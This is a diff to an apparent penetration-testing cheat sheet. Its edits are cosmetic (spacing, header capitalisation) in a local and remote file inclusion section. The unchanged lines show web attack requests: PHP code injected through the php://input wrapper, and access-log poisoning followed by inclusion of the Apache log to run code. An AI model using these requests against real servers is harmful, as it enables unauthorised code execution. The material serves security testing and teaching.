@@ -148,7 +148,9 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 ## **LFI**
 
-### Get shell
+
+### Get shell
+
 
 **RFI**
 
@@ -172,7 +174,7 @@ Using a proxy like Burp, change the request to a POST request and use the wrappe
 
 ```php
 POST <targeturi>/<vulnrable_paramter>=php://input
-host: <target>
+Host: <target>
 
 <?php phpinfo(); ?>
 ```
@@ -181,10 +183,10 @@ host: <target>
 If you find the access log, you can make a GET request with your php code :
 ```php
 GET <targeturi>/<vulnrable_paramter>=<?php phpinfo(); ?>
-host: <target>
+Host: <target>
 
 GET <targeturi>/<vulnrable_paramter>=/var/log/apache2/access.log
-host: <target>
+Host: <target>
 
 ```
 
